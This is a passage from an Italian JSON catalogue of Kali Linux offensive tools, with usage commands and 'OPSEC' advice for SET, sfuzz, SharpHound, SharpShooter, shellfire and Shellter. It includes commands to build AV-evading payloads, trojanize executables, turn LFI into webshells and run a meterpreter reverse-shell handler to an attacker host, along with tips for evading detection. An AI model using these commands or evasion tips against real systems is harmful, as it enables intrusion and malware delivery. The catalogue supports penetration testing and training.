payload e listener</code></pre><p>SET richiede una connessione internet attiva per la clonazione dei siti e configurazione corretta del networking per ricevere le connessioni reverse. In ambienti NAT e necessario configurare il port forwarding.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per assessment di security awareness aziendale, SET viene utilizzato per condurre campagne di phishing controllate che misurano la percentuale di dipendenti che inseriscono credenziali in pagine clone o aprono allegati sospetti. I risultati forniscono metriche concrete per giustificare investimenti in formazione sulla sicurezza. In operazioni di red team, SET fornisce il vettore di initial access tramite social engineering, tipicamente combinato con payload Metasploit per ottenere una shell sul sistema della vittima. La clonazione di portali aziendali interni e particolarmente efficace quando combinata con domini typosquatting registrati per la campagna. Per dimostrazioni didattiche e workshop sulla sicurezza, SET permette di mostrare in tempo reale come funzionano gli attacchi di phishing, sensibilizzando i partecipanti sui rischi e sulle tecniche di riconoscimento delle email fraudolente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I siti clonati da SET possono essere identificati dai sistemi di web filtering e safe browsing tramite analisi del certificato SSL, dominio e contenuto. Le email di phishing sono soggette ai controlli SPF/DKIM/DMARC e ai filtri anti-phishing enterprise. I payload generati con Metasploit di default hanno signature note e vengono rilevati dalla maggior parte degli antivirus.</p><p><strong>Impatto operativo:</strong> Le campagne di phishing non autorizzate sono illegali e possono causare danni reputazionali significativi. I payload Metasploit possono essere instabili e causare crash delle applicazioni target. Il credential harvester cattura credenziali reali che devono essere gestite con estrema attenzione per evitare violazioni della privacy.</p><p><strong>Mitigazioni:</strong> Ottenere autorizzazione scritta dettagliata prima di ogni campagna, specificando scope, target e durata. Utilizzare certificati SSL validi e domini credibili per test realistici. Cifrare e cancellare le credenziali catturate immediatamente dopo la documentazione. Coordinarsi con il team IT per evitare falsi incidenti di sicurezza. Utilizzare payload personalizzati invece di quelli di default per evitare detection immediata.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "sfuzz",
    "name": "sfuzz",
    "version": "0.7.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sfuzz/",
    "desc": "Simple fuzzer per protocolli di rete con pattern e payload personalizzabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sfuzz</strong> (Simple Fuzzer) e un fuzzer leggero e configurabile progettato per il testing di sicurezza di protocolli di rete. A differenza di framework di fuzzing complessi come AFL o Boofuzz, Sfuzz adotta un approccio minimalista: legge un file di configurazione che definisce il protocollo target, il pattern di base del pacchetto e la posizione dei campi da fuzzare, quindi invia iterativamente variazioni del payload al servizio target incrementando progressivamente la dimensione e il contenuto dei dati iniettati. Questo approccio lo rende ideale per test rapidi di robustezza su servizi di rete custom o proprietari dove non si dispone di un modello completo del protocollo. Sfuzz supporta sia TCP che UDP, gestisce timeout e connessioni multiple, e produce output dettagliato sulle risposte ricevute per identificare crash, hang e comportamenti anomali del servizio target.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Fuzzing basato su template configurabili:</strong> Sfuzz utilizza file di configurazione in formato testo che definiscono il protocollo di trasporto (TCP/UDP), l'indirizzo e porta del target, e il template del pacchetto con placeholder per i dati fuzz. Il placeholder %%FUZZ%% viene sostituito con stringhe di lunghezza crescente contenenti caratteri ripetuti, permettendo di testare buffer overflow e parsing errors in punti specifici del protocollo.</p><p><strong>Incremento progressivo e sequenze di attacco:</strong> Lo strumento supporta l'incremento graduale della dimensione del payload fuzz, con parametri configurabili per lunghezza iniziale, incremento per iterazione e lunghezza massima. Questo approccio sistematico permette di identificare con precisione la dimensione del buffer che causa il crash, informazione critica per lo sviluppo successivo dell'exploit. Sfuzz supporta anche sequenze di pacchetti multipli per protocolli che richiedono handshake iniziali.</p><p><strong>Monitoraggio risposte e detection anomalie:</strong> Durante il fuzzing, Sfuzz monitora le risposte del servizio target e registra variazioni nel comportamento come assenza di risposta, risposte troncate, timeout e disconnessioni improvvise. Questi indicatori aiutano a identificare rapidamente quali payload causano problemi senza necessita di un debugger collegato al processo target, sebbene l'analisi dettagliata della vulnerabilita richieda strumenti aggiuntivi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sfuzz si configura tramite file di testo che descrivono il target e il pattern di fuzzing. Il file di configurazione definisce protocollo, host, porta e template del pacchetto.</p><pre><code># File di configurazione esempio (http_fuzz.sfz)\n# Protocollo: tcp\n# Target: 192.168.1.100:80\n# GET /%%FUZZ%% HTTP/1.0\\r\\n\\r\\n\n\n# Fuzzing con file di configurazione\nsfuzz -f http_fuzz.sfz\n\n# Con lunghezza massima e incremento personalizzati\nsfuzz -f http_fuzz.sfz -l 5000 -i 50\n\n# Fuzzing servizio FTP\n# Config: tcp, target:21\n# USER %%FUZZ%%\\r\\n\nsfuzz -f ftp_fuzz.sfz\n\n# Fuzzing con timeout personalizzato\nsfuzz -f config.sfz -t 5\n\n# Fuzzing UDP (es. DNS o SNMP custom)\nsfuzz -f udp_service.sfz</code></pre><p>Nota: e fortemente consigliato eseguire il servizio target in un ambiente isolato (VM o container) con un debugger collegato per catturare i crash e analizzare lo stato della memoria al momento del fault. Strumenti come GDB o WinDbg sono complementari a Sfuzz per l'analisi delle vulnerabilita scoperte.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella vulnerability research su servizi di rete proprietari, Sfuzz fornisce un metodo rapido per identificare bug di parsing e buffer overflow senza richiedere la creazione di modelli protocollari complessi. La sua semplicita lo rende ideale per test iniziali di robustezza su servizi custom sviluppati internamente. Per il testing di sicurezza di dispositivi IoT e embedded, dove i servizi di rete spesso implementano parser protocollari con validazione insufficiente, Sfuzz puo rivelare vulnerabilita critiche con minimo sforzo di configurazione. In contesti formativi, lo strumento rappresenta un'introduzione pratica ai concetti di fuzzing, permettendo agli studenti di comprendere il processo di discovery delle vulnerabilita di rete partendo da uno strumento semplice prima di passare a framework piu complessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il traffico generato dal fuzzing e altamente anomalo e facilmente identificabile da IDS/IPS e sistemi di monitoraggio di rete. I payload contenenti lunghe sequenze di caratteri ripetuti e pattern crescenti sono signature tipiche di attivita di fuzzing. Qualsiasi sistema di deep packet inspection rilevera immediatamente questa attivita.</p><p><strong>Impatto operativo:</strong> Il fuzzing puo e probabilmente causera il crash del servizio target, risultando in denial of service per gli utenti legittimi. Alcuni crash possono corrompere dati persistenti del servizio, rendendo necessario un ripristino da backup. Su sistemi embedded, un crash potrebbe richiedere un riavvio fisico del dispositivo, con conseguente indisponibilita prolungata.</p><p><strong>Mitigazioni:</strong> Eseguire sempre il fuzzing in ambienti di test isolati, mai su sistemi di produzione senza autorizzazione esplicita e finestre di manutenzione dedicate. Iniziare con payload piccoli e incrementare gradualmente per minimizzare l'impatto. Mantenere backup della configurazione del servizio target e predisporre procedure di ripristino rapido. Documentare ogni sessione di fuzzing con timestamp e parametri utilizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "sharphound",
    "name": "sharphound",
    "version": "2.7.1",
    "icon": "../app/icons/sharphound-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sharphound/",
    "desc": "Collector BloodHound per AD: enumera utenti, gruppi, sessioni, ACL per attack paths.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpHound</strong> e il collector ufficiale del progetto BloodHound, lo strumento standard de facto per l'analisi degli attack path in ambienti Active Directory. SharpHound enumera sistematicamente tutti gli oggetti di Active Directory - utenti, gruppi, computer, Group Policy Object (GPO), Organizational Unit (OU), trust tra domini e foreste - raccogliendo inoltre informazioni critiche come sessioni utente attive, permessi ACL (Access Control List) e deleghe Kerberos. I dati raccolti vengono esportati in formato JSON compresso e importati nell'interfaccia grafica di BloodHound, dove algoritmi di graph theory identificano automaticamente i percorsi di attacco piu brevi verso obiettivi ad alto valore come Domain Admin. SharpHound e scritto in C# e puo essere eseguito come eseguibile standalone o come modulo PowerShell, richiedendo solo credenziali di dominio standard (nessun privilegio amministrativo) per la maggior parte delle operazioni di raccolta.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Collection methods granulari e componibili:</strong> SharpHound offre diversi metodi di raccolta dati selezionabili individualmente o combinabili: Default (gruppi, trust, sessioni, ACL), All (tutto incluso GPO e OU), DCOnly (solo interrogazioni al Domain Controller via LDAP, piu stealth), Session (solo sessioni attive), ACL (solo permessi), ObjectProps (proprieta degli oggetti). Questa granularita permette di bilanciare completezza dei dati e rumore generato, adattando la raccolta al contesto operativo.</p><p><strong>Modalita loop per raccolta sessioni continue:</strong> L'opzione --loop permette a SharpHound di raccogliere periodicamente le sessioni utente attive sui computer del dominio per un periodo di tempo specificato con --looptime. Questa funzionalita e fondamentale perche le sessioni sono temporanee: un utente Domain Admin potrebbe accedere a un workstation solo per pochi minuti, e una singola raccolta potrebbe non catturare questa informazione critica per identificare percorsi di lateral movement.</p><p><strong>Output strutturato per BloodHound e stealth options:</strong> I dati vengono esportati in file JSON compressi in formato ZIP, pronti per l'importazione diretta in BloodHound. SharpHound supporta opzioni per ridurre il footprint operativo: --throttle aggiunge delay tra le query LDAP, --jitter randomizza i tempi, --excludedc esclude i domain controller dal session collection, e --stealth limita le query ai soli domain controller evitando il contatto diretto con i workstation.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SharpHound puo essere eseguito come eseguibile .NET o come modulo PowerShell (Invoke-BloodHound). Richiede credenziali di dominio valide, tipicamente ottenute tramite la sessione corrente dell'utente compromesso.</p><pre><code># Collection completa di tutti i dati\nSharpHound.exe -c All\n\n# Collection solo da Domain Controller (piu stealth)\nSharpHound.exe -c DCOnly\n\n# Collection sessioni con loop di 2 ore\nSharpHound.exe -c Session --loop --loopduration 02:00:00\n\n# Collection con throttling per ridurre il rumore\nSharpHound.exe -c All --throttle 1000 --jitter 20\n\n# Targeting dominio specifico\nSharpHound.exe -c All -d child.domain.local\n\n# Collection stealth (solo DC, nessun contatto workstation)\nSharpHound.exe -c All --stealth\n\n# Via PowerShell\nImport-Module .\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All\n\n# Output in directory specifica\nSharpHound.exe -c All --outputdirectory C:\\Temp\\bh_data</code></pre><p>Dopo la raccolta, importare i file ZIP generati nell'interfaccia web di BloodHound per la visualizzazione e l'analisi degli attack path. Le query predefinite di BloodHound identificano automaticamente i percorsi piu critici.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel penetration testing di ambienti Active Directory, SharpHound rappresenta tipicamente uno dei primi strumenti eseguiti dopo aver ottenuto un foothold nel dominio. La mappatura completa degli attack path rivela percorsi di privilege escalation non evidenti dall'analisi manuale, come catene di permessi ACL che attraversano gruppi nested, sessioni privilegiate su workstation accessibili, o deleghe Kerberos configurate in modo insicuro. Per security assessment e audit di conformita, BloodHound con i dati di SharpHound fornisce una visualizzazione immediata della postura di sicurezza di Active Directory, evidenziando configurazioni pericolose come utenti con DCSync rights, computer con unconstrained delegation, o gruppi con permessi eccessivi che creano percorsi non intenzionali verso Domain Admin. In operazioni di red team prolungate, la raccolta periodica delle sessioni tramite la modalita loop permette di identificare finestre temporali in cui amministratori privilegiati accedono a sistemi compromessi, informazione critica per pianificare movimenti laterali verso obiettivi di alto valore.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'esecuzione di SharpHound genera un volume significativo di query LDAP che puo essere rilevato da Microsoft Defender for Identity (MDI, ex ATA), che ha signature specifiche per l'enumeration di BloodHound. Il session collection contatta direttamente i workstation sulla porta 445 (SMB), generando connessioni anomale facilmente correlabili. L'eseguibile SharpHound.exe ha signature antivirus note e puo essere bloccato da soluzioni EDR.</p><p><strong>Impatto operativo:</strong> La raccolta completa (metodo All) su domini di grandi dimensioni genera migliaia di query LDAP in breve tempo, potenzialmente impattando le prestazioni dei Domain Controller. Il session collection su centinaia di workstation crea traffico di rete rilevante. I file ZIP di output contengono informazioni estremamente sensibili sulla struttura del dominio e devono essere protetti adeguatamente.</p><p><strong>Mitigazioni:</strong> Utilizzare il metodo DCOnly quando possibile per evitare contatti diretti con i workstation. Abilitare throttling e jitter per distribuire le query nel tempo. Eseguire SharpHound da un processo legittimo tramite execute-assembly o inline execution per evitare la creazione di artefatti su disco. Cifrare e cancellare i file di output dopo l'importazione in BloodHound. Considerare l'uso di versioni modificate o BOF (Beacon Object Files) per evitare signature note.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "sharpshooter",
    "name": "sharpshooter",
    "version": "2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sharpshooter/",
    "desc": "Genera payload stageless in VBA, JS, HTA con tecniche di evasione AV integrate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpShooter</strong> e un framework per la generazione di payload stageless progettato per operazioni di initial access in campagne di red team. Sviluppato da MDSec, lo strumento genera payload in molteplici formati di file comunemente utilizzati in ambienti enterprise - VBA macro per documenti Office, JavaScript (.js), HTML Application (.hta), VBScript (.vbs) e Windows Script Component (.sct) - incorporando tecniche di evasione integrate per bypassare soluzioni antivirus e AMSI (Antimalware Scan Interface). SharpShooter si distingue per l'approccio stageless: il payload completo e contenuto nel file generato senza necessita di download di stage aggiuntivi, riducendo le opportunita di detection durante la fase di delivery. Lo strumento supporta inoltre tecniche di sandbox evasion per evitare l'analisi automatizzata e puo generare payload che eseguono shellcode arbitrario o caricano assembly .NET direttamente in memoria.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Generazione payload multi-formato con evasione integrata:</strong> SharpShooter genera payload in formati diversi (HTA, JS, VBS, VBA, SCT), ognuno con tecniche di offuscamento specifiche per il formato. I payload VBA utilizzano tecniche di auto-decodifica per evitare la detection statica delle macro, mentre i payload JavaScript e HTA impiegano encoding multipli e code splitting. Ogni formato e ottimizzato per il contesto di delivery specifico: le macro per allegati email, gli HTA per link web, gli SCT per utilizzo con regsvr32.</p><p><strong>Bypass AMSI e sandbox detection:</strong> Lo strumento integra molteplici tecniche per il bypass di AMSI, inclusa la patch in memoria di amsi.dll per disabilitare la scansione dei contenuti script prima dell'esecuzione del payload. I moduli di sandbox detection verificano indicatori come dimensione della RAM, numero di processori, presenza di tool di analisi, nomi di processi tipici di sandbox e tempo di esecuzione, abortendo l'esecuzione quando rilevano un ambiente di analisi automatizzata.</p><p><strong>Esecuzione shellcode e .NET assembly in memoria:</strong> SharpShooter supporta l'esecuzione diretta di shellcode binario tramite tecniche di process injection, e il caricamento di assembly .NET in memoria senza toccare il disco tramite reflection. Questa capacita permette di utilizzare qualsiasi payload Cobalt Strike, Metasploit o personalizzato come shellcode sorgente, e di eseguire strumenti .NET come Rubeus, Seatbelt o SharpHound direttamente dal payload iniziale senza deployment aggiuntivo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SharpShooter e uno script Python che genera i payload in base ai parametri specificati. Richiede lo shellcode o l'assembly .NET da incorporare nel payload come input.</p><pre><code># Generazione payload HTA con shellcode\npython SharpShooter.py --payload hta --delivery web --output payload --shellcode shellcode.raw --smuggling --template mcafee\n\n# Generazione macro VBA per documento Office\npython SharpShooter.py --payload vba --delivery macro --output macro_payload --shellcode shellcode.raw\n\n# Payload JavaScript con AMSI bypass\npython SharpShooter.py --payload js --delivery web --output js_payload --shellcode shellcode.raw --amsi amsienable\n\n# Payload con sandbox evasion\npython SharpShooter.py --payload hta --delivery web --output evasive_payload --shellcode shellcode.raw --sandbox 1,2,3,4\n\n# SCT payload per utilizzo con regsvr32\npython SharpShooter.py --payload sct --delivery web --output sct_payload --shellcode shellcode.raw\n\n# Payload con .NET assembly (esecuzione in memoria)\npython SharpShooter.py --payload hta --delivery web --output dotnet_payload --dotnetv4 --assembly assembly.exe --class Program --method Main</code></pre><p>Lo shellcode sorgente puo essere generato con msfvenom (Metasploit) o con il payload generator di Cobalt Strike. Il formato atteso e raw shellcode binario senza header aggiuntivi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nelle operazioni di red team, SharpShooter viene utilizzato per generare i payload di initial access da distribuire tramite campagne di spear-phishing. I documenti Office con macro VBA vengono inviati come allegati email, mentre i payload HTA e JavaScript possono essere ospitati su server web e distribuiti tramite link. La combinazione di offuscamento e sandbox evasion aumenta significativamente la probabilita di superare i controlli di sicurezza perimetrali. Per il testing delle capacita di detection dell'organizzazione, i payload generati da SharpShooter permettono di valutare l'efficacia delle soluzioni antivirus, EDR e gateway email nel rilevare diversi formati e tecniche di evasione, fornendo informazioni concrete su quali vettori necessitano di controlli aggiuntivi. In contesti di purple team, i payload possono essere utilizzati per sviluppare e validare regole di detection YARA, Sigma e custom per il SOC, migliorando la capacita dell'organizzazione di rilevare attacchi reali che utilizzano tecniche simili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload generati da SharpShooter con template di default hanno signature note presso i principali vendor antivirus e vengono frequentemente identificati. Le tecniche di AMSI bypass integrate sono documentate pubblicamente e monitorate dalle soluzioni EDR moderne. I file HTA e SCT attivano warning di sicurezza in Windows e possono essere bloccati da policy di Application Whitelisting come AppLocker o WDAC.</p><p><strong>Impatto operativo:</strong> I payload stageless hanno dimensioni superiori rispetto ai stager, aumentando la probabilita di detection durante il transito attraverso gateway email o proxy web. L'esecuzione di macro VBA richiede che l'utente abiliti esplicitamente le macro, e le versioni recenti di Office bloccano le macro nei documenti provenienti da Internet. I payload con sandbox evasion possono fallire su sistemi reali che presentano caratteristiche simili a sandbox.</p><p><strong>Mitigazioni:</strong> Personalizzare i template e le tecniche di offuscamento per evitare signature note. Testare i payload contro le soluzioni di sicurezza specifiche del target prima del deployment. Utilizzare HTML smuggling per il delivery dei payload via web per bypassare l'ispezione del contenuto. Hostare i payload su infrastruttura dedicata con certificati SSL validi e domini categorizzati per evitare il blocco da parte dei proxy web. Aggiornare regolarmente le tecniche di evasione poiche le signature vengono continuamente aggiornate dai vendor.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "shellfire",
    "name": "shellfire",
    "version": "0.14",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/shellfire/",
    "desc": "Sfrutta vulnerabilità LFI per ottenere shell remote su server web vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Shellfire</strong> e uno strumento offensivo progettato per automatizzare lo sfruttamento di vulnerabilita Local File Inclusion (LFI) con l'obiettivo di ottenere esecuzione remota di codice (RCE) su server web vulnerabili. La tecnica LFI consente a un attaccante di includere file locali dal server attraverso parametri non validati nelle applicazioni web, e Shellfire porta questa vulnerabilita al livello successivo trasformandola in una shell interattiva completa. Lo strumento integra diverse tecniche di escalation tra cui log poisoning, injection via /proc/self/environ, PHP wrappers (base64, data, expect) e filter chain exploitation. Shellfire analizza automaticamente il contesto del target per selezionare la tecnica piu appropriata, riducendo significativamente il tempo necessario per passare da una LFI scoperta a un accesso shell effettivo. E particolarmente utile durante penetration test su applicazioni PHP dove le vulnerabilita LFI sono state identificate ma necessitano di essere dimostrate come critiche attraverso RCE.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Escalation automatica LFI to RCE:</strong> Shellfire implementa un workflow automatizzato che testa sequenzialmente diverse tecniche di escalation per trasformare una vulnerabilita LFI in esecuzione di codice remoto. Il tool verifica la disponibilita di log file scrivibili, variabili di ambiente accessibili e wrappers PHP abilitati, selezionando la tecnica con maggiore probabilita di successo. Questa automazione elimina il processo manuale e iterativo tipicamente richiesto durante l'exploitation LFI.</p><p><strong>Log Poisoning e Environment Injection:</strong> Lo strumento inietta codice PHP malevolo nei log del web server (access.log, error.log) attraverso header HTTP manipolati come User-Agent o Referer. Successivamente include il file di log tramite la vulnerabilita LFI, causando l'esecuzione del codice iniettato. In alternativa, sfrutta /proc/self/environ per iniettare payload attraverso variabili di ambiente del processo web server.</p><p><strong>PHP Wrappers e Filter Chains:</strong> Shellfire utilizza wrapper PHP come php://filter per leggere file sorgente in formato base64, php://data per iniettare codice direttamente nel parametro, e php://expect per eseguire comandi di sistema. Le filter chain avanzate combinano multipli filtri PHP per ottenere esecuzione arbitraria di codice anche quando i wrapper piu comuni sono disabilitati dalla configurazione del server.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Shellfire viene tipicamente utilizzato dopo che una vulnerabilita LFI e stata identificata durante la fase di assessment. Il parametro vulnerabile deve essere specificato nell'URL, e lo strumento si occupa di testare e sfruttare le diverse tecniche disponibili.</p><pre><code># Exploit LFI automatico con detection delle tecniche disponibili\nshellfire -u \"http://target.com/page.php?file=\" -l\n\n# Specifica tecnica di log poisoning\nshellfire -u \"http://target.com/page.php?file=\" -t logpoisoning\n\n# Utilizza PHP wrapper per bypass filtri\nshellfire -u \"http://target.com/page.php?file=\" -t phpwrapper\n\n# Specifica un file di log personalizzato per il poisoning\nshellfire -u \"http://target.com/page.php?file=\" -t logpoisoning --logfile /var/log/apache2/access.log\n\n# Upload webshell automatico dopo exploitation\nshellfire -u \"http://target.com/page.php?file=\" --shell</code></pre><p>Dopo aver ottenuto la shell, e consigliabile stabilire una reverse shell piu stabile e procedere con la post-exploitation. Il tool genera output dettagliato su ogni tecnica tentata, facilitando la documentazione nel report.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>penetration test su applicazioni web PHP</strong>, quando viene identificata una vulnerabilita LFI attraverso scanner o test manuali, Shellfire automatizza il processo di escalation a RCE permettendo di dimostrare l'impatto reale della vulnerabilita al cliente. Questo e fondamentale per classificare correttamente la severita nel report finale.</p><p>In contesti di <strong>CTF e training</strong>, Shellfire accelera la risoluzione di challenge basate su LFI fornendo un framework strutturato per testare rapidamente tutte le tecniche note di escalation, permettendo ai partecipanti di concentrarsi sulla comprensione dei meccanismi sottostanti piuttosto che sulla ripetizione manuale dei tentativi.</p><p>Per attivita di <strong>ricerca sulla sicurezza web</strong>, lo strumento serve come piattaforma per testare nuove tecniche di exploitation LFI e verificare l'efficacia di contromisure implementate su web application firewall e configurazioni PHP hardened.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I tentativi di LFI exploitation generano pattern altamente riconoscibili nei log del web server, inclusi path traversal sequences (../../) e riferimenti a file sensibili come /etc/passwd o file di log. I Web Application Firewall moderni hanno regole specifiche per bloccare questi pattern, e i sistemi IDS/IPS generano alert per tentativi di directory traversal.</p><p><strong>Impatto operativo:</strong> L'injection nei log del server lascia tracce permanenti del codice PHP malevolo. Le webshell caricate durante l'exploitation persistono sul filesystem del target e possono essere scoperte da scansioni di integrita. Il traffico HTTP anomalo generato durante il fuzzing delle tecniche e facilmente distinguibile dal traffico legittimo in analisi retrospettive.</p><p><strong>Mitigazioni:</strong> Utilizzare canali cifrati HTTPS per mascherare il contenuto dei payload nei log di rete. Eseguire cleanup immediato delle webshell dopo aver ottenuto una reverse shell stabile. Limitare il numero di tentativi e distribuirli nel tempo per ridurre la visibilita. Documentare tutte le tracce lasciate per il report e per il cleanup post-engagement.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "shellter",
    "name": "shellter",
    "version": "7.2",
    "icon": "../app/icons/shellter-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/shellter/",
    "desc": "Inietta shellcode in PE Windows legittimi per bypass AV con tecniche polimorfiche.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Shellter</strong> e uno strumento avanzato di dynamic PE infection che consente di iniettare shellcode arbitrario all'interno di eseguibili Windows (PE - Portable Executable) legittimi, mantenendo la funzionalita originale del programma ospite. A differenza di approcci statici che modificano semplicemente l'entry point, Shellter esegue il PE target in un ambiente di tracing per analizzare il flusso di esecuzione reale e identificare i punti ottimali per l'iniezione. Il motore polimorfico integrato garantisce che ogni payload generato sia unico, rendendo inefficace la detection basata su signature statiche. Shellter supporta sia payload predefiniti di Metasploit sia shellcode completamente personalizzato, offrendo massima flessibilita nelle operazioni red team. Lo strumento e diventato uno dei metodi piu affidabili per creare eseguibili trojanizzati che superano i controlli antivirus tradizionali.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Dynamic PE Analysis e Injection:</strong> Shellter esegue il PE target in modalita trace per mappare il flusso di esecuzione reale del programma, identificando code caves e punti di iniezione naturali nel codice. Questo approccio dinamico garantisce che il payload venga inserito in una posizione raggiungibile durante l'esecuzione normale, evitando le problematiche tipiche dell'iniezione statica come sezioni non eseguite o alignment errati. Il processo preserva la funzionalita originale dell'eseguibile.</p><p><strong>Motore polimorfico e anti-analysis:</strong> Ogni iniezione produce un risultato unico grazie al motore polimorfico che genera decoder e stub diversi ad ogni esecuzione. Shellter implementa inoltre tecniche anti-debugging e anti-emulation che rendono piu difficile l'analisi automatica in sandbox AV. I payload vengono codificati con chiavi generate dinamicamente e il decoder stesso e offuscato per evitare pattern riconoscibili.</p><p><strong>Stealth mode e preservazione funzionalita:</strong> La modalita stealth permette di mantenere completamente operativo il programma originale dopo l'iniezione del payload. L'utente che esegue il PE trojanizzato vedra il comportamento atteso del software legittimo mentre il payload viene eseguito in background. Shellter gestisce il threading e il ripristino del flusso di esecuzione originale per garantire trasparenza completa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Shellter puo operare in modalita automatica, dove gestisce l'intero processo con impostazioni ottimali, o in modalita manuale per operatori esperti che necessitano di controllo granulare. E consigliabile utilizzare PE legittimi firmati e comunemente presenti sui sistemi target.</p><pre><code># Avvia Shellter in modalita automatica\nshellter -a\n\n# Workflow tipico in modalita automatica:\n# 1. Specificare il PE target (es. putty.exe, 7z.exe, notepad++.exe)\n# 2. Abilitare stealth mode per preservare funzionalita\n# 3. Selezionare payload (Listed = Metasploit, Custom = shellcode proprio)\n# 4. Per payload Metasploit: scegliere tipo (meterpreter_reverse_tcp)\n# 5. Configurare LHOST e LPORT\n# 6. Shellter produce il PE trojanizzato\n\n# Modalita manuale (interattiva, controllo completo)\nshellter\n\n# Verifica con msfconsole\nmsfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST attacker_ip; set LPORT 4444; exploit\"</code></pre><p>Per massimizzare l'evasion, scegliere PE a 32-bit con molte code caves. Eseguibili come putty.exe, WinRAR installer o 7-Zip sono scelte comuni per la loro diffusione e dimensione adeguata. Evitare PE troppo piccoli o con sezioni protette.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di <strong>red team con componente social engineering</strong>, Shellter permette di creare payload mascherati da software legittimo per campagne di phishing mirate. Un eseguibile come PuTTY o un installer di software comune puo essere trojanizzato e distribuito via email o siti web compromessi, aumentando significativamente la probabilita che la vittima lo esegua.</p><p>Per <strong>test di evasion antivirus</strong>, Shellter e utilizzato per valutare l'efficacia delle soluzioni di endpoint protection. I team di sicurezza possono generare varianti polimorfiche per verificare se gli AV del cliente rilevano payload iniettati in PE legittimi, fornendo metriche concrete sulla capacita di detection dell'infrastruttura difensiva.</p><p>Durante operazioni di <strong>persistence su sistemi compromessi</strong>, gli operatori possono sostituire eseguibili comunemente utilizzati con versioni trojanizzate che mantengono la funzionalita originale. Ogni volta che l'utente lancia il programma, il payload viene rieseguito garantendo la riconnessione al C2.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene il motore polimorfico eviti signature statiche, le soluzioni EDR moderne utilizzano behavioral analysis che puo rilevare l'attivita del payload dopo l'iniezione. AMSI (Anti-Malware Scan Interface) su Windows 10+ puo intercettare shellcode durante l'esecuzione. I PE modificati avranno hash diversi dagli originali, invalidando eventuali verifiche di integrita basate su hash o firma digitale.</p><p><strong>Impatto operativo:</strong> La distribuzione di PE trojanizzati lascia artefatti sul filesystem del target e potenzialmente sui sistemi di email filtering. I sandbox avanzati possono analizzare il PE in ambiente controllato prima della consegna. VirusTotal e servizi simili, se utilizzati per test, condividono i campioni con i vendor AV compromettendo l'efficacia futura del payload.</p><p><strong>Mitigazioni:</strong> Non caricare mai payload su VirusTotal o servizi di scanning pubblici. Utilizzare ambienti isolati con AV offline per i test di evasion. Preferire PE comunemente presenti nell'ambiente target per ridurre sospetti. Ruotare frequentemente i payload e rigenerare con nuove chiavi polimorfiche per ogni operazione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "sherlock",
    "name": "sherlock",
    "version": "0.15.0",
    "icon": "../app/icons/sherlock-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sherlock/",
    "desc": "Trova account social collegati a username su 400+ siti web e piattaforme online.",
